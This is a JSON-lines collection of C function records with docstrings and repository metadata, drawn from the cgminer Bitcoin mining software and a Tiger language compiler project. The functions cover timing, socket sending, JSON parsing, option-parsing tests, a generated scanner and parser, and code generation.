{"docstring": "/* Return the system time as an lldiv_t in decimicroseconds. */\n", "func_signal": "static void decius_time(lldiv_t *lidiv)", "code": "{\n\tFILETIME ft;\n\tLARGE_INTEGER li;\n\n\tGetSystemTimeAsFileTime(&ft);\n\tli.LowPart  = ft.dwLowDateTime;\n\tli.HighPart = ft.dwHighDateTime;\n\tli.QuadPart -= EPOCHFILETIME;\n\n\t/* SystemTime is in decimicroseconds so divide by an unusual number */\n\t*lidiv = lldiv(li.QuadPart, 10000000);\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Check to see if Santa's been good to you */\n", "func_signal": "bool sock_full(struct pool *pool)", "code": "{\n\tif (strlen(pool->sockbuf))\n\t\treturn true;\n\n\treturn (socket_full(pool, 0));\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* This is a cgminer gettimeofday wrapper. Since we always call gettimeofday\n * with tz set to NULL, and windows' default resolution is only 15ms, this\n * gives us higher resolution times on windows. */\n", "func_signal": "void cgtime(struct timeval *tv)", "code": "{\n\tlldiv_t lidiv;\n\n\tdecius_time(&lidiv);\n\ttv->tv_sec = lidiv.quot;\n\ttv->tv_usec = lidiv.rem / 10;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Test helpers. */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tchar *output;\n\tchar *longname = strdup(\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\");\n\tchar *shortname = strdup(\"shortname\");\n\n\tplan_tests(48);\n\topt_register_table(subtables, NULL);\n\topt_register_noarg(\"--kkk|-k\", my_cb, NULL, \"magic kkk option\");\n\topt_register_noarg(\"-?\", opt_usage_and_exit, \"<MyArgs>...\",\n\t\t\t   \"This message\");\n\topt_register_arg(\"--longname\", opt_set_charp, opt_show_charp,\n\t\t\t &longname, \"a really long option default\");\n\topt_register_arg(\"--shortname\", opt_set_charp, opt_show_charp,\n\t\t\t &shortname, \"a short option default\");\n\toutput = opt_usage(\"my name\", \"ExTrA Args\");\n\tdiag(\"%s\", output);\n\tok1(strstr(output, \"Usage: my name\"));\n\tok1(strstr(output, \"--jjj|-j|--lll|-l <arg>\"));\n\tok1(strstr(output, \"ExTrA Args\"));\n\tok1(strstr(output, \"-a \"));\n\tok1(strstr(output, \" Description of a\\n\"));\n\tok1(strstr(output, \"-b <arg>\"));\n\tok1(strstr(output, \" Description of b (default: b)\\n\"));\n\tok1(strstr(output, \"--ddd \"));\n\tok1(strstr(output, \" Description of ddd\\n\"));\n\tok1(strstr(output, \"--eee <filename> \"));\n\tok1(strstr(output, \" (default: eee)\\n\"));\n\tok1(strstr(output, \"long table options:\\n\"));\n\tok1(strstr(output, \"--ggg|-g \"));\n\tok1(strstr(output, \" Description of ggg\\n\"));\n\tok1(strstr(output, \"-h|--hhh <arg>\"));\n\tok1(strstr(output, \" Description of hhh\\n\"));\n\tok1(strstr(output, \"--kkk|-k\"));\n\tok1(strstr(output, \"magic kkk option\"));\n\t/* This entry is hidden. */\n\tok1(!strstr(output, \"--mmm|-m\"));\n\tfree(output);\n\n\t/* NULL should use string from registered options. */\n\toutput = opt_usage(\"my name\", NULL);\n\tdiag(\"%s\", output);\n\tok1(strstr(output, \"Usage: my name\"));\n\tok1(strstr(output, \"--jjj|-j|--lll|-l <arg>\"));\n\tok1(strstr(output, \"<MyArgs>...\"));\n\tok1(strstr(output, \"-a \"));\n\tok1(strstr(output, \" Description of a\\n\"));\n\tok1(strstr(output, \"-b <arg>\"));\n\tok1(strstr(output, \" Description of b (default: b)\\n\"));\n\tok1(strstr(output, \"--ddd \"));\n\tok1(strstr(output, \" Description of ddd\\n\"));\n\tok1(strstr(output, \"--eee <filename> \"));\n\tok1(strstr(output, \" (default: eee)\\n\"));\n\tok1(strstr(output, \"long table options:\\n\"));\n\tok1(strstr(output, \"--ggg|-g \"));\n\tok1(strstr(output, \" Description of ggg\\n\"));\n\tok1(strstr(output, \"-h|--hhh <arg>\"));\n\tok1(strstr(output, \" Description of hhh\\n\"));\n\tok1(strstr(output, \"--kkk|-k\"));\n\tok1(strstr(output, \"magic kkk option\"));\n\tok1(strstr(output, \"--longname\"));\n\tok1(strstr(output, \"a really long option default\"));\n\tok1(strstr(output, \"(default: \\\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\\"...)\"));\n\tok1(strstr(output, \"--shortname\"));\n\tok1(strstr(output, \"a short option default\"));\n\tok1(strstr(output, \"(default: \\\"shortname\\\")\"));\n\t/* This entry is hidden. */\n\tok1(!strstr(output, \"--mmm|-m\"));\n\tfree(output);\n\n\treset_options();\n\t/* Empty table test. */\n\toutput = opt_usage(\"nothing\", NULL);\n\tok1(strstr(output, \"Usage: nothing \\n\"));\n\tfree(output);\n\n\t/* No short args. */\n\topt_register_noarg(\"--aaa\", test_noarg, NULL, \"AAAAll\");\n\toutput = opt_usage(\"onearg\", NULL);\n\tok1(strstr(output, \"Usage: onearg \\n\"));\n\tok1(strstr(output, \"--aaa\"));\n\tok1(strstr(output, \"AAAAll\"));\n\tfree(output);\n\n\tfree(shortname);\n\tfree(longname);\n\treturn exit_status();\n}", "path": "ccan\\opt\\test\\run-usage.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Returns a malloced array string of a binary value of arbitrary length. The\n * array is rounded up to a 4 byte size to appease architectures that need\n * aligned array  sizes */\n", "func_signal": "char *bin2hex(const unsigned char *p, size_t len)", "code": "{\n\tssize_t slen;\n\tchar *s;\n\n\tslen = len * 2 + 1;\n\tif (slen % 4)\n\t\tslen += 4 - (slen % 4);\n\ts = calloc(slen, 1);\n\tif (unlikely(!s))\n\t\tquithere(1, \"Failed to calloc\");\n\n\t__bin2hex(s, p, len);\n\n\treturn s;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Make sure the pool sockbuf is large enough to cope with any coinbase size\n * by reallocing it to a large enough size rounded up to a multiple of RBUFSIZE\n * and zeroing the new memory */\n", "func_signal": "static void recalloc_sock(struct pool *pool, size_t len)", "code": "{\n\tsize_t old, new;\n\n\told = strlen(pool->sockbuf);\n\tnew = old + len + 1;\n\tif (new < pool->sockbuf_size)\n\t\treturn;\n\tnew = new + (RBUFSIZE - (new % RBUFSIZE));\n\t// Avoid potentially recursive locking\n\t// applog(LOG_DEBUG, \"Recallocing pool sockbuf to %d\", new);\n\tpool->sockbuf = realloc(pool->sockbuf, new);\n\tif (!pool->sockbuf)\n\t\tquithere(1, \"Failed to realloc pool sockbuf\");\n\tmemset(pool->sockbuf + old, 0, new - old);\n\tpool->sockbuf_size = new;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Search no more than N bytes of S for C.  */\n", "func_signal": "void *\n__memchr (void const *s, int c_in, size_t n)", "code": "{\n  /* On 32-bit hardware, choosing longword to be a 32-bit unsigned\n     long instead of a 64-bit uintmax_t tends to give better\n     performance.  On 64-bit hardware, unsigned long is generally 64\n     bits already.  Change this typedef to experiment with\n     performance.  */\n  typedef unsigned long int longword;\n\n  const unsigned char *char_ptr;\n  const longword *longword_ptr;\n  longword repeated_one;\n  longword repeated_c;\n  unsigned reg_char c;\n\n  c = (unsigned char) c_in;\n\n  /* Handle the first few bytes by reading one byte at a time.\n     Do this until CHAR_PTR is aligned on a longword boundary.  */\n  for (char_ptr = (const unsigned char *) s;\n       n > 0 && (size_t) char_ptr % sizeof (longword) != 0;\n       --n, ++char_ptr)\n    if (*char_ptr == c)\n      return (void *) char_ptr;\n\n  longword_ptr = (const longword *) char_ptr;\n\n  /* All these elucidatory comments refer to 4-byte longwords,\n     but the theory applies equally well to any size longwords.  */\n\n  /* Compute auxiliary longword values:\n     repeated_one is a value which has a 1 in every byte.\n     repeated_c has c in every byte.  */\n  repeated_one = 0x01010101;\n  repeated_c = c | (c << 8);\n  repeated_c |= repeated_c << 16;\n  if (0xffffffffU < (longword) -1)\n    {\n      repeated_one |= repeated_one << 31 << 1;\n      repeated_c |= repeated_c << 31 << 1;\n      if (8 < sizeof (longword))\n        {\n          size_t i;\n\n          for (i = 64; i < sizeof (longword) * 8; i *= 2)\n            {\n              repeated_one |= repeated_one << i;\n              repeated_c |= repeated_c << i;\n            }\n        }\n    }\n\n  /* Instead of the traditional loop which tests each byte, we will test a\n     longword at a time.  The tricky part is testing if *any of the four*\n     bytes in the longword in question are equal to c.  We first use an xor\n     with repeated_c.  This reduces the task to testing whether *any of the\n     four* bytes in longword1 is zero.\n\n     We compute tmp =\n       ((longword1 - repeated_one) & ~longword1) & (repeated_one << 7).\n     That is, we perform the following operations:\n       1. Subtract repeated_one.\n       2. & ~longword1.\n       3. & a mask consisting of 0x80 in every byte.\n     Consider what happens in each byte:\n       - If a byte of longword1 is zero, step 1 and 2 transform it into 0xff,\n         and step 3 transforms it into 0x80.  A carry can also be propagated\n         to more significant bytes.\n       - If a byte of longword1 is nonzero, let its lowest 1 bit be at\n         position k (0 <= k <= 7); so the lowest k bits are 0.  After step 1,\n         the byte ends in a single bit of value 0 and k bits of value 1.\n         After step 2, the result is just k bits of value 1: 2^k - 1.  After\n         step 3, the result is 0.  And no carry is produced.\n     So, if longword1 has only non-zero bytes, tmp is zero.\n     Whereas if longword1 has a zero byte, call j the position of the least\n     significant zero byte.  Then the result has a zero at positions 0, ...,\n     j-1 and a 0x80 at position j.  We cannot predict the result at the more\n     significant bytes (positions j+1..3), but it does not matter since we\n     already have a non-zero bit at position 8*j+7.\n\n     So, the test whether any byte in longword1 is zero is equivalent to\n     testing whether tmp is nonzero.  */\n\n  while (n >= sizeof (longword))\n    {\n      longword longword1 = *longword_ptr ^ repeated_c;\n\n      if ((((longword1 - repeated_one) & ~longword1)\n           & (repeated_one << 7)) != 0)\n        break;\n      longword_ptr++;\n      n -= sizeof (longword);\n    }\n\n  char_ptr = (const unsigned char *) longword_ptr;\n\n  /* At this point, we know that either n < sizeof (longword), or one of the\n     sizeof (longword) bytes starting at char_ptr is == c.  On little-endian\n     machines, we could determine the first such byte without any further\n     memory accesses, just by looking at the tmp result from the last loop\n     iteration.  But this does not work on big-endian machines.  Choose code\n     that works in both cases.  */\n\n  for (; n > 0; --n, ++char_ptr)\n    {\n      if (*char_ptr == c)\n        return (void *) char_ptr;\n    }\n\n  return NULL;\n}", "path": "lib\\memchr.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Extracts a string value from a json array with error checking. To be used\n * when the value of the string returned is only examined and not to be stored.\n * See json_array_string below */\n", "func_signal": "static char *__json_array_string(json_t *val, unsigned int entry)", "code": "{\n\tjson_t *arr_entry;\n\n\tif (json_is_null(val))\n\t\treturn NULL;\n\tif (!json_is_array(val))\n\t\treturn NULL;\n\tif (entry > json_array_size(val))\n\t\treturn NULL;\n\tarr_entry = json_array_get(val, entry);\n\tif (!json_is_string(arr_entry))\n\t\treturn NULL;\n\n\treturn (char *)json_string_value(arr_entry);\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* assumes that str points to 'u' plus at least 4 valid hex digits */\n", "func_signal": "static int32_t decode_unicode_escape(const char *str)", "code": "{\n    int i;\n    int32_t value = 0;\n\n    assert(str[0] == 'u');\n\n    for(i = 1; i <= 4; i++) {\n        char c = str[i];\n        value <<= 4;\n        if(l_isdigit(c))\n            value += c - '0';\n        else if(l_islower(c))\n            value += c - 'a' + 10;\n        else if(l_isupper(c))\n            value += c - 'A' + 10;\n        else\n            assert(0);\n    }\n\n    return value;\n}", "path": "compat\\jansson-2.5\\src\\load.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/*** lexical analyzer ***/\n", "func_signal": "static void\nstream_init(stream_t *stream, get_func get, void *data)", "code": "{\n    stream->get = get;\n    stream->data = data;\n    stream->buffer[0] = '\\0';\n    stream->buffer_pos = 0;\n\n    stream->state = STREAM_STATE_OK;\n    stream->line = 1;\n    stream->column = 0;\n    stream->position = 0;\n}", "path": "compat\\jansson-2.5\\src\\load.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* __MACH__ - Everything not linux/macosx/win32 */\n", "func_signal": "void cgtimer_time(cgtimer_t *ts_start)", "code": "{\n\tstruct timeval tv;\n\n\tcgtime(&tv);\n\tts_start->tv_sec = tv->tv_sec;\n\tts_start->tv_nsec = tv->tv_usec * 1000;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/*\n * N.B. IP4 addresses are by Definition 32bit big endian on all platforms\n */\n", "func_signal": "static void setup_ipaccess()", "code": "{\n\tchar *buf, *ptr, *comma, *slash, *dot;\n\tint ipcount, mask, octet, i;\n\tchar group;\n\n\tbuf = malloc(strlen(opt_api_allow) + 1);\n\tif (unlikely(!buf))\n\t\tquit(1, \"Failed to malloc ipaccess buf\");\n\n\tstrcpy(buf, opt_api_allow);\n\n\tipcount = 1;\n\tptr = buf;\n\twhile (*ptr)\n\t\tif (*(ptr++) == ',')\n\t\t\tipcount++;\n\n\t// possibly more than needed, but never less\n\tipaccess = calloc(ipcount, sizeof(struct IP4ACCESS));\n\tif (unlikely(!ipaccess))\n\t\tquit(1, \"Failed to calloc ipaccess\");\n\n\tips = 0;\n\tptr = buf;\n\twhile (ptr && *ptr) {\n\t\twhile (*ptr == ' ' || *ptr == '\\t')\n\t\t\tptr++;\n\n\t\tif (*ptr == ',') {\n\t\t\tptr++;\n\t\t\tcontinue;\n\t\t}\n\n\t\tcomma = strchr(ptr, ',');\n\t\tif (comma)\n\t\t\t*(comma++) = '\\0';\n\n\t\tgroup = NOPRIVGROUP;\n\n\t\tif (isalpha(*ptr) && *(ptr+1) == ':') {\n\t\t\tif (DEFINEDGROUP(*ptr))\n\t\t\t\tgroup = GROUP(*ptr);\n\n\t\t\tptr += 2;\n\t\t}\n\n\t\tipaccess[ips].group = group;\n\n\t\tif (strcmp(ptr, ALLIP4) == 0)\n\t\t\tipaccess[ips].ip = ipaccess[ips].mask = 0;\n\t\telse {\n\t\t\tslash = strchr(ptr, '/');\n\t\t\tif (!slash)\n\t\t\t\tipaccess[ips].mask = 0xffffffff;\n\t\t\telse {\n\t\t\t\t*(slash++) = '\\0';\n\t\t\t\tmask = atoi(slash);\n\t\t\t\tif (mask < 1 || mask > 32)\n\t\t\t\t\tgoto popipo; // skip invalid/zero\n\n\t\t\t\tipaccess[ips].mask = 0;\n\t\t\t\twhile (mask-- >= 0) {\n\t\t\t\t\toctet = 1 << (mask % 8);\n\t\t\t\t\tipaccess[ips].mask |= (octet << (24 - (8 * (mask >> 3))));\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tipaccess[ips].ip = 0; // missing default to '.0'\n\t\t\tfor (i = 0; ptr && (i < 4); i++) {\n\t\t\t\tdot = strchr(ptr, '.');\n\t\t\t\tif (dot)\n\t\t\t\t\t*(dot++) = '\\0';\n\n\t\t\t\toctet = atoi(ptr);\n\t\t\t\tif (octet < 0 || octet > 0xff)\n\t\t\t\t\tgoto popipo; // skip invalid\n\n\t\t\t\tipaccess[ips].ip |= (octet << (24 - (i * 8)));\n\n\t\t\t\tptr = dot;\n\t\t\t}\n\n\t\t\tipaccess[ips].ip &= ipaccess[ips].mask;\n\t\t}\n\n\t\tips++;\npopipo:\n\t\tptr = comma;\n\t}\n\n\tfree(buf);\n}", "path": "api.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Reentrant version of cgsleep functions allow start time to be set separately\n * from the beginning of the actual sleep, allowing scheduling delays to be\n * counted in the sleep. */\n", "func_signal": "void cgsleep_ms_r(cgtimer_t *ts_start, int ms)", "code": "{\n\tstruct timespec ts_end;\n\n\tms_to_timespec(&ts_end, ms);\n\ttimeraddspec(&ts_end, ts_start);\n\tnanosleep_abstime(&ts_end);\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Creates a freshly malloced dup of __json_array_string */\n", "func_signal": "static char *json_array_string(json_t *val, unsigned int entry)", "code": "{\n\tchar *buf = __json_array_string(val, entry);\n\n\tif (buf)\n\t\treturn strdup(buf);\n\treturn NULL;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Send a single command across a socket, appending \\n to it. This should all\n * be done under stratum lock except when first establishing the socket */\n", "func_signal": "static enum send_ret __stratum_send(struct pool *pool, char *s, ssize_t len)", "code": "{\n\tSOCKETTYPE sock = pool->sock;\n\tssize_t ssent = 0;\n\n\tstrcat(s, \"\\n\");\n\tlen++;\n\n\twhile (len > 0 ) {\n\t\tstruct timeval timeout = {1, 0};\n\t\tssize_t sent;\n\t\tfd_set wd;\n\n\t\tFD_ZERO(&wd);\n\t\tFD_SET(sock, &wd);\n\t\tif (select(sock + 1, NULL, &wd, NULL, &timeout) < 1)\n\t\t\treturn SEND_SELECTFAIL;\n#ifdef __APPLE__\n\t\tsent = send(pool->sock, s + ssent, len, SO_NOSIGPIPE);\n#elif WIN32\n\t\tsent = send(pool->sock, s + ssent, len, 0);\n#else\n\t\tsent = send(pool->sock, s + ssent, len, MSG_NOSIGNAL);\n#endif\n\t\tif (sent < 0) {\n\t\t\tif (!sock_blocks())\n\t\t\t\treturn SEND_SENDFAIL;\n\t\t\tsent = 0;\n\t\t}\n\t\tssent += sent;\n\t\tlen -= sent;\n\t}\n\n\tpool->cgminer_pool_stats.times_sent++;\n\tpool->cgminer_pool_stats.bytes_sent += ssent;\n\tpool->cgminer_pool_stats.net_bytes_sent += ssent;\n\treturn SEND_OK;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* Make a text readable version of a string using 0xNN for < ' ' or > '~'\n * Including 0x00 at the end\n * You must free the result yourself */\n", "func_signal": "void *str_text(char *ptr)", "code": "{\n\tunsigned char *uptr;\n\tchar *ret, *txt;\n\n\tif (ptr == NULL) {\n\t\tret = strdup(\"(null)\");\n\n\t\tif (unlikely(!ret))\n\t\t\tquithere(1, \"Failed to malloc null\");\n\t}\n\n\tuptr = (unsigned char *)ptr;\n\n\tret = txt = malloc(strlen(ptr)*4+5); // Guaranteed >= needed\n\tif (unlikely(!txt))\n\t\tquithere(1, \"Failed to malloc txt\");\n\n\tdo {\n\t\tif (*uptr < ' ' || *uptr > '~') {\n\t\t\tsprintf(txt, \"0x%02x\", *uptr);\n\t\t\ttxt += 4;\n\t\t} else\n\t\t\t*(txt++) = *uptr;\n\t} while (*(uptr++));\n\n\t*txt = '\\0';\n\n\treturn ret;\n}", "path": "util.c", "repo_name": "Kalroth/cgminer-3.7.2-kalroth", "stars": 56, "license": "other", "language": "c", "size": 13879}
{"docstring": "/* yy_get_next_buffer - try to read in a new buffer\n *\n * Returns a code representing an action:\n *\tEOB_ACT_LAST_MATCH -\n *\tEOB_ACT_CONTINUE_SCAN - continue scanning from current position\n *\tEOB_ACT_END_OF_FILE - end of file\n */\n", "func_signal": "static int yy_get_next_buffer (void)", "code": "{\n    \tregister char *dest = YY_CURRENT_BUFFER_LVALUE->yy_ch_buf;\n\tregister char *source = (yytext_ptr);\n\tregister int number_to_move, i;\n\tint ret_val;\n\n\tif ( (yy_c_buf_p) > &YY_CURRENT_BUFFER_LVALUE->yy_ch_buf[(yy_n_chars) + 1] )\n\t\tYY_FATAL_ERROR(\n\t\t\"fatal flex scanner internal error--end of buffer missed\" );\n\n\tif ( YY_CURRENT_BUFFER_LVALUE->yy_fill_buffer == 0 )\n\t\t{ /* Don't try to fill the buffer, so this is an EOF. */\n\t\tif ( (yy_c_buf_p) - (yytext_ptr) - YY_MORE_ADJ == 1 )\n\t\t\t{\n\t\t\t/* We matched a single character, the EOB, so\n\t\t\t * treat this as a final EOF.\n\t\t\t */\n\t\t\treturn EOB_ACT_END_OF_FILE;\n\t\t\t}\n\n\t\telse\n\t\t\t{\n\t\t\t/* We matched some text prior to the EOB, first\n\t\t\t * process it.\n\t\t\t */\n\t\t\treturn EOB_ACT_LAST_MATCH;\n\t\t\t}\n\t\t}\n\n\t/* Try to read more data. */\n\n\t/* First move last chars to start of buffer. */\n\tnumber_to_move = (int) ((yy_c_buf_p) - (yytext_ptr)) - 1;\n\n\tfor ( i = 0; i < number_to_move; ++i )\n\t\t*(dest++) = *(source++);\n\n\tif ( YY_CURRENT_BUFFER_LVALUE->yy_buffer_status == YY_BUFFER_EOF_PENDING )\n\t\t/* don't do the read, it's not guaranteed to return an EOF,\n\t\t * just force an EOF\n\t\t */\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = (yy_n_chars) = 0;\n\n\telse\n\t\t{\n\t\t\tint num_to_read =\n\t\t\tYY_CURRENT_BUFFER_LVALUE->yy_buf_size - number_to_move - 1;\n\n\t\twhile ( num_to_read <= 0 )\n\t\t\t{ /* Not enough room in the buffer - grow it. */\n\n\t\t\t/* just a shorter name for the current buffer */\n\t\t\tYY_BUFFER_STATE b = YY_CURRENT_BUFFER;\n\n\t\t\tint yy_c_buf_p_offset =\n\t\t\t\t(int) ((yy_c_buf_p) - b->yy_ch_buf);\n\n\t\t\tif ( b->yy_is_our_buffer )\n\t\t\t\t{\n\t\t\t\tint new_size = b->yy_buf_size * 2;\n\n\t\t\t\tif ( new_size <= 0 )\n\t\t\t\t\tb->yy_buf_size += b->yy_buf_size / 8;\n\t\t\t\telse\n\t\t\t\t\tb->yy_buf_size *= 2;\n\n\t\t\t\tb->yy_ch_buf = (char *)\n\t\t\t\t\t/* Include room in for 2 EOB chars. */\n\t\t\t\t\tyyrealloc((void *) b->yy_ch_buf,b->yy_buf_size + 2  );\n\t\t\t\t}\n\t\t\telse\n\t\t\t\t/* Can't grow it, we don't own it. */\n\t\t\t\tb->yy_ch_buf = 0;\n\n\t\t\tif ( ! b->yy_ch_buf )\n\t\t\t\tYY_FATAL_ERROR(\n\t\t\t\t\"fatal error - scanner input buffer overflow\" );\n\n\t\t\t(yy_c_buf_p) = &b->yy_ch_buf[yy_c_buf_p_offset];\n\n\t\t\tnum_to_read = YY_CURRENT_BUFFER_LVALUE->yy_buf_size -\n\t\t\t\t\t\tnumber_to_move - 1;\n\n\t\t\t}\n\n\t\tif ( num_to_read > YY_READ_BUF_SIZE )\n\t\t\tnum_to_read = YY_READ_BUF_SIZE;\n\n\t\t/* Read in more data. */\n\t\tYY_INPUT( (&YY_CURRENT_BUFFER_LVALUE->yy_ch_buf[number_to_move]),\n\t\t\t(yy_n_chars), (size_t) num_to_read );\n\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_n_chars = (yy_n_chars);\n\t\t}\n\n\tif ( (yy_n_chars) == 0 )\n\t\t{\n\t\tif ( number_to_move == YY_MORE_ADJ )\n\t\t\t{\n\t\t\tret_val = EOB_ACT_END_OF_FILE;\n\t\t\tyyrestart(yyin  );\n\t\t\t}\n\n\t\telse\n\t\t\t{\n\t\t\tret_val = EOB_ACT_LAST_MATCH;\n\t\t\tYY_CURRENT_BUFFER_LVALUE->yy_buffer_status =\n\t\t\t\tYY_BUFFER_EOF_PENDING;\n\t\t\t}\n\t\t}\n\n\telse\n\t\tret_val = EOB_ACT_CONTINUE_SCAN;\n\n\tif ((yy_size_t) ((yy_n_chars) + number_to_move) > YY_CURRENT_BUFFER_LVALUE->yy_buf_size) {\n\t\t/* Extend the array by 50%, plus the number we really need. */\n\t\tyy_size_t new_size = (yy_n_chars) + number_to_move + ((yy_n_chars) >> 1);\n\t\tYY_CURRENT_BUFFER_LVALUE->yy_ch_buf = (char *) yyrealloc((void *) YY_CURRENT_BUFFER_LVALUE->yy_ch_buf,new_size  );\n\t\tif ( ! YY_CURRENT_BUFFER_LVALUE->yy_ch_buf )\n\t\t\tYY_FATAL_ERROR( \"out of dynamic memory in yy_get_next_buffer()\" );\n\t}\n\n\t(yy_n_chars) += number_to_move;\n\tYY_CURRENT_BUFFER_LVALUE->yy_ch_buf[(yy_n_chars)] = YY_END_OF_BUFFER_CHAR;\n\tYY_CURRENT_BUFFER_LVALUE->yy_ch_buf[(yy_n_chars) + 1] = YY_END_OF_BUFFER_CHAR;\n\n\t(yytext_ptr) = &YY_CURRENT_BUFFER_LVALUE->yy_ch_buf[0];\n\n\treturn ret_val;\n}", "path": "src\\lex.yy.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* Copy to YYRES the contents of YYSTR after stripping away unnecessary\n   quotes and backslashes, so that it's suitable for yyerror.  The\n   heuristic is that double-quoting is unnecessary unless the string\n   contains an apostrophe, a comma, or backslash (other than\n   backslash-backslash).  YYSTR is taken from yytname.  If YYRES is\n   null, do not copy; instead, return the length of what the result\n   would have been.  */\n", "func_signal": "static YYSIZE_T\nyytnamerr (char *yyres, const char *yystr)", "code": "{\n  if (*yystr == '\"')\n    {\n      YYSIZE_T yyn = 0;\n      char const *yyp = yystr;\n\n      for (;;)\n\tswitch (*++yyp)\n\t  {\n\t  case '\\'':\n\t  case ',':\n\t    goto do_not_strip_quotes;\n\n\t  case '\\\\':\n\t    if (*++yyp != '\\\\')\n\t      goto do_not_strip_quotes;\n\t    /* Fall through.  */\n\t  default:\n\t    if (yyres)\n\t      yyres[yyn] = *yyp;\n\t    yyn++;\n\t    break;\n\n\t  case '\"':\n\t    if (yyres)\n\t      yyres[yyn] = '\\0';\n\t    return yyn;\n\t  }\n    do_not_strip_quotes: ;\n    }\n\n  if (! yyres)\n    return yystrlen (yystr);\n\n  return yystpcpy (yyres, yystr) - yyres;\n}", "path": "src\\y.tab.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/*\n * Implementation of the the codegen interface.\n */\n", "func_signal": "AS_instrList F_codegen(F_frame frame, T_stmList stmList)", "code": "{\n\tAS_instrList asList = NULL;\n\tT_stmList sList = stmList;\n\tfor (; sList; sList = sList->tail)\n\t\tmunchStm(sList->head);\n\tasList = instrList;\n\tinstrList = last = NULL;\n\treturn asList;\n}", "path": "src\\amd64codegen.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* print the assembly language instructions to filename.s */\n", "func_signal": "static void doProc(FILE *out, F_frame frame, T_stm body)", "code": "{\n\tAS_proc proc;\n\tstruct RA_result allocation;\n\tT_stmList stmList;\n\tAS_instrList iList;\n\t\n\tstmList = C_linearize(body);\n\tstmList = C_traceSchedule(C_basicBlocks(stmList));\n\t/* printStmList(stdout, stmList);*/\n\tiList  = F_codegen(frame, stmList); /* 9 */\n\tallocation = RA_regAlloc(frame, iList); /* 11 */\n\t\n\tAS_printInstrList (out, iList,\n\t\t\t\t\t   Temp_layerMap(allocation.coloring,Temp_name())); \n}", "path": "test\\regalloctest.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* The cast from pointer to integer in the expression\n *   ((unsigned)key) % TABSIZE\n * may lead to a warning message.  However, the code is safe,\n * and will still operate correctly.  This line is just hashing\n * a pointer value into an integer value, and no matter how the\n * conversion is done, as long as it is done consistently, a\n * reasonable and repeatable index into the table will result.\n */\n", "func_signal": "void TAB_enter(TAB_table t, void *key, void *value)", "code": "{int index;\n assert(t && key);\n index = ((unsigned)key) % TABSIZE;\n t->table[index] = Binder(key, value,t->table[index], t->top);\n t->top = key;\n}", "path": "src\\table.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
{"docstring": "/* This will infinite loop on mutually recursive types */\n", "func_signal": "void Ty_print(Ty_ty t)", "code": "{\n  if (t == NULL) printf(\"null\");\n  else { printf(\"%s\", str_ty[t->kind]);\n         if (t->kind == Ty_name) {\n\t   printf(\", %s\", S_name(t->u.name.sym)); }\n       }\n}", "path": "src\\types.c", "repo_name": "cmcl/tiger", "stars": 56, "license": "None", "language": "c", "size": 420}
